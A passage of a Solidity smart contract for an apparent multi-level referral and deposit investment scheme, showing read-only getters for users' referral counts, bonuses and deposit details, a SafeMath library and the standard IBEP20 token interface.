TimersRef = user.checkpointLVR1RefBonus;
	}

	function SE_getUsertotal_LevelReferrals1US_Timer3(address userAddress) public view returns(uint256 countSE, uint256 TimerSE, address adrSE) {
	    User storage user = users[userAddress];

countSE = user.SE_total_LevelReferrals1US_Timer;
TimerSE = user.SE_total_LevelReferrals1US;
adrSE = user.SE_total_LevelReferrals1US_ADR;
	}




	function DEP_REF(address userAddress) public view returns(uint256 checkpointTimer2, address adres22, uint256 Count22) {
	    User storage user = users[userAddress];

checkpointTimer2 = user.DEP_REF_activatesRefer_Timer;
Count22 = user.DEP_REF_activatesReferADD ;
adres22 = user.DEP_REF_activatesReferADR ;
	}


    	function DEP_REF_1(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

uint256 totalAmount2;
if (user.DEP_REF_activatesRefer_Timer >=1 )
{totalAmount2 = 555;}
else {totalAmount2 = 123;}
return totalAmount2;
	}

	function REG__levels_Referals(address userAddress) public view returns(uint256 checkpointTimer, address adres1,address adres3,address adres4, uint256 Count, address adres2) {
	    User storage user = users[userAddress];

checkpointTimer = user.REG_checkpoint_levels_Referals;
adres1 = user.REG_Dep_levels_Referals;
Count = user.REG_Count_levels_Referals;
adres2 = user.REG_Raddress_levels_Referals;
adres3 = user.REG2_Raddress_levels_Referals;
adres4 = user.REG3_Raddress_levels_Referals;
	}

	function DEP__levels_Referals(address userAddress) public view returns(uint256 checkpointTimer, address adres1, uint256 Count, address adres2) {
	    User storage user = users[userAddress];

checkpointTimer = user.DEP_checkpoint_levels_Referals;
adres1 = user.DEP_Dep_levels_Referals;
Count = user.DEP_Count_levels_Referals;
adres2 = user.DEP_Raddress_levels_Referals;
	}

	function DEP_MY_levels_Referals(address userAddress) public view returns(uint256 checkpointTimer, address adres1, uint256 Count, address adres2) {
	    User storage user = users[userAddress];

checkpointTimer = user.DEP_MY_checkpoint_levels_Referals;
adres1 = user.DEP_MY_Dep_levels_Referals;
Count = user.DEP_MY_Count_levels_Referals;
adres2 = user.DEP_MY_Raddress_levels_Referals;
	}

    function getUsercheckpointRefBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpointRefBonus;
    }

    function getUserREFBonsINVEST(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].REFBonsINVEST;
    }


    function getUsercheckpointRegRefBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpointRegRefBonus;
    }
    function getUsercheckpointLVR1RefBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpointLVR1RefBonus;
    }



    function getUserReferrer(address userAddress)
        public
        view
        returns (address)
    {
        return users[userAddress].referrer;
    }

	function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
		return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);
	}

    function getUserTotalReferrals(address userAddress)
        public
        view
        returns (uint256)
    {
        return 
            users[userAddress].levels[0];
    }
	function getUserDownlineCount_levels_Ref(address userAddress) public view returns(uint256) {
		return (users[userAddress].levels_Ref[0]);
	}

    function getUserTotalReferrals_levels_Ref(address userAddress)
        public
        view
        returns (uint256)
    {
        return
            users[userAddress].levels_Ref[0];
    }

    	function getUserDownlineCount_levels_My(address userAddress) public view returns(uint256) {
		return (users[userAddress].levels_My[0]);
	}

    function getUserTotalReferrals_levels_My(address userAddress)
        public
        view
        returns (uint256)
    {
        return
            users[userAddress].levels_My[0];
    }
    function getUserReferralBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].totalBonus.sub(users[userAddress].bonus);
    }

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}


    function getUserAmountOfDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress)
        public
        view
        returns (uint256 amount)
    {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount = amount.add(users[userAddress].deposits[i].amount);
        }
    }

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 lvel, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		lvel = user.deposits[index].lvel;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		profit = user.deposits[index].profit;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish;
	}


	function getUserLastDepositInfo(address userAddress, uint8 lvel) public view returns( uint256 percent, uint256 amount, uint256 start, uint256 finish, uint256 profit) {
	    User storage user = users[userAddress];
		if(user.deposits.length > 0){
			lvel = user.deposits[users[userAddress].deposits.length - 1].lvel;
			percent = user.deposits[users[userAddress].deposits.length - 1].percent;
			amount = user.deposits[users[userAddress].deposits.length - 1].amount;
			start = user.deposits[users[userAddress].deposits.length - 1].start;
			finish = user.deposits[users[userAddress].deposits.length - 1].finish;
			profit = user.deposits[users[userAddress].deposits.length - 1].profit;
		}	
	}

    function getSiteInfo()
        public
        view
        returns (uint256 _totalInvested, uint256 _totalBonus, uint256 _totalDeposits, uint256 _totalRefers)
    {
        return (totalInvested, totalRefBonus, totalDeposits, totalRefers);
    }

       //  user.totalRefersUS = user.totalRefersUS.add(1);



    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}


interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}